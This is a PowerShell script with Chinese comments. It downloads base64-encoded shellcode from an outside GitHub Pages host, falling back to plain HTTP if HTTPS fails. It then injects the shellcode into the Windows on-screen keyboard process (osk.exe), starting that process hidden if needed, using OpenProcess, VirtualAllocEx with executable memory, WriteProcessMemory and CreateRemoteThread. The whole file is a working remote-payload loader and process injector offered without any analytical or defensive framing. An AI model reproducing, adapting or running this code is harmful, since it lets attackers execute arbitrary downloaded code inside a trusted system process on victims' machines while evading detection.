# 导入必要的Windows API函数和常量定义
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

// Win32 API函数定义
public class Win32 {
    // 打开进程API
    [DllImport("kernel32.dll")]
    public static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);
    
    // 在远程进程中分配内存API
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
    // 写入远程进程内存API
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);
    
    // 创建远程线程API
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    
    // 关闭句柄API
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
    
    // 获取最后错误代码
    [DllImport("kernel32.dll")]
    public static extern uint GetLastError();
    
    // 进程访问权限常量
    public const int PROCESS_CREATE_THREAD = 0x0002;
    public const int PROCESS_QUERY_INFORMATION = 0x0400;
    public const int PROCESS_VM_OPERATION = 0x0008;
    public const int PROCESS_VM_WRITE = 0x0020;
    public const int PROCESS_VM_READ = 0x0010;
    
    // 内存分配常量
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
}
"@

# 全局变量定义
$shellcodeUrl = "https://me2hk.github.io/"                                                # 在线获取shellcode的URL
$targetProcessName = "osk"                                                                # 注入目标进程名称
$injectionSuccess = $false                                                                # 注入成功标志


# 在线获取shellcode函数
function Download-String {
    param($url)
    try {
        # 使用WebClient下载字符串
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        return $webClient.DownloadString($url)
    }
    catch {
        Write-Host "下载失败: $($_.Exception.Message)"

        # 尝试使用非HTTPS链接
        if ($url.StartsWith("https://")) {
            $httpUrl = $url.Replace("https://", "http://")
            try {
                $webClient = New-Object System.Net.WebClient
                $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                return $webClient.DownloadString($httpUrl)
            }
            catch {
                # 如果非安全连接也失败，重新抛出原始异常
                throw $_.Exception
            }
        }
        throw
    }
}

# 根据进程名获取PID函数
function Get-ProcessPidByName {
    param($processName)
    # 确保进程名不包含.exe扩展名
    if ($processName.EndsWith(".exe")) {
        $processName = $processName.Substring(0, $processName.Length - 4)
    }
    
    # 获取指定名称的进程
    $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
    
    if ($processes) {
        return $processes[0].Id
    }
    return -1
}

# 隐藏启动进程函数
function Start-ProcessHidden {
    param($processName)
    try {
        # 构建进程完整路径
        $systemDir = $env:SystemDirectory
        if ([string]::IsNullOrEmpty($systemDir)) {
            $systemDir = "$env:windir\System32"
        }
        
        $processPath = Join-Path $systemDir $processName
        
        Write-Host "[*] shellcode 目标路径：$processPath"
        
        # 检查文件是否存在
        if (-not (Test-Path $processPath)) {
            Write-Host "进程文件不存在: $processPath"
            # 尝试在System32目录中查找
            $altPath = "$env:windir\System32\$processName"
            if (Test-Path $altPath) {
                $processPath = $altPath
                Write-Host "找到替代路径: $processPath"
            } else {
                Write-Host "无法找到进程文件"
                return
            }
        }
        
        # 使用Start-Process启动进程
        $process = Start-Process -FilePath $processPath -WindowStyle Hidden -PassThru
        if ($process) {
            # Write-Host "[*] shellcode 启动进程：$processName (PID: $($process.Id))"
            return $process.Id
        } else {
            Write-Host "启动进程失败: 无法启动进程"
            return -1
        }
    }
    catch {
        Write-Host "启动进程失败: $($_.Exception.Message)"
        Write-Host "错误详情: $($_.Exception.GetType().FullName)"
        if ($_.Exception.InnerException) {
            Write-Host "内部错误: $($_.Exception.InnerException.Message)"
        }
        return -1
    }
}

# 注入shellcode到指定进程函数
function Inject {
    param($shellcode, $procPID)
    $procHandle = [IntPtr]::Zero
    $allocMemAddress = [IntPtr]::Zero
    $remoteThread = [IntPtr]::Zero
    $result = -1  # 默认失败

    try {
        # 打开目标进程，获取进程句柄
        $procHandle = [Win32]::OpenProcess(
            [Win32]::PROCESS_CREATE_THREAD -bor [Win32]::PROCESS_QUERY_INFORMATION -bor 
            [Win32]::PROCESS_VM_OPERATION -bor [Win32]::PROCESS_VM_WRITE -bor [Win32]::PROCESS_VM_READ,
            $false, $procPID
        )

        if ($procHandle -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "打开进程失败，错误代码: $errorCode"
            return -1
        }

        Write-Host "[*] shellcode 打开进程：osk （句柄：$procHandle）"

        # 在目标进程中分配内存
        $allocMemAddress = [Win32]::VirtualAllocEx(
            $procHandle, [IntPtr]::Zero, [System.UInt32]$shellcode.Length,
            [Win32]::MEM_COMMIT -bor [Win32]::MEM_RESERVE, [Win32]::PAGE_EXECUTE_READWRITE
        )

        if ($allocMemAddress -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "分配内存失败，错误代码: $errorCode"
            return -1
        }

        Write-Host "[*] shellcode 分配内存：osk（地址：$allocMemAddress）"

        # 将shellcode写入目标进程的内存
        $bytesWritten = [UIntPtr]::Zero
        $writeResult = [Win32]::WriteProcessMemory(
            $procHandle, $allocMemAddress, $shellcode, [System.UInt32]$shellcode.Length, [ref]$bytesWritten
        )

        if (!$writeResult) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "写入内存失败，错误代码: $errorCode"
            return -1
        }

        Write-Host "[*] shellcode 写入内存：osk（字节：$bytesWritten）"

        # 在目标进程中创建远程线程执行shellcode
        $remoteThread = [Win32]::CreateRemoteThread(
            $procHandle, [IntPtr]::Zero, 0, $allocMemAddress, [IntPtr]::Zero, 0, [IntPtr]::Zero
        )

        if ($remoteThread -eq [IntPtr]::Zero) {
            $errorCode = [Win32]::GetLastError()
            Write-Host "创建远程线程失败，错误代码: $errorCode"
            return -1
        }

        Write-Host "[*] shellcode 启动线程：osk（句柄：$remoteThread）"
        Write-Host "[*] shellcode 启动完成：osk （注入成功）"
        $result = 0  # 成功
    }
    catch {
        Write-Host "注入过程中发生错误: $($_.Exception.Message)"
        Write-Host "错误类型: $($_.Exception.GetType().FullName)"
        if ($_.Exception.InnerException) {
            Write-Host "内部错误: $($_.Exception.InnerException.Message)"
        }
        $result = -1
    }
    finally {
        # 清理资源
        if ($procHandle -ne [IntPtr]::Zero) {
            [void][Win32]::CloseHandle($procHandle)
        }
        if ($remoteThread -ne [IntPtr]::Zero) {
            [void][Win32]::CloseHandle($remoteThread)
        }
    }
    
    return $result
}

# 主执行逻辑
try {
    # 设置安全协议为TLS 1.2
    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

    # 在线获取shellcode的Base64编码
    Write-Host "[*] shellcode 远程地址：https://me2hk.github.io"
    $base64Shellcode = Download-String $shellcodeUrl
    $shellcode = [Convert]::FromBase64String($base64Shellcode)
    Write-Host "[*] shellcode 下载完成：$($shellcode.Length) 字节"

    # 获取osk进程的PID
    $targetPid = Get-ProcessPidByName $targetProcessName

    # 如果未找到进程，则隐藏启动它
    if ($targetPid -eq -1) {
        Write-Host "[*] shellcode 查找进程：osk （未启动）"
        $targetPid = Start-ProcessHidden "osk.exe"
        
        if ($targetPid -eq -1) {
            Write-Host "无法启动osk进程"
            Show-MessageBox "错误" "无法启动目标进程"
            exit
        }
        
        # 等待进程启动
        Start-Sleep -Seconds 2
        Write-Host "[*] shellcode 启动进程：osk（PID: $targetPid）"
    } else {
        Write-Host "[*] shellcode 启动进程：osk（已启动）" #退出
    }

    # 注入shellcode到目标进程
    $result = Inject $shellcode $targetPid
    
    # 更详细的成功判断
    if ($result -eq 0) {
        $injectionSuccess = $true
        
        # 验证注入是否真的成功 - 检查远程线程是否仍在运行
        Start-Sleep -Seconds 1
        
        # 显示注入完成消息框
        Write-Host "注入成功!"
    }
    else {
        # 注入失败
        Write-Host "注入操作失败，返回代码: $result"
        # Show-MessageBox "关于" "         状态:  注入失败!"
        Write-Host "注入失败!"
    }
}
catch {
    # 异常处理
    Write-Host "发生错误: $($_.Exception.Message)"
    Write-Host "错误类型: $($_.Exception.GetType().FullName)"
    Write-Host "堆栈跟踪: $($_.ScriptStackTrace)"
    if ($_.Exception.InnerException) {
        Write-Host "内部异常: $($_.Exception.InnerException.Message)"
    }

    # 显示错误消息框
    Write-Host "程序执行过程中发生错误: $($_.Exception.Message)"
}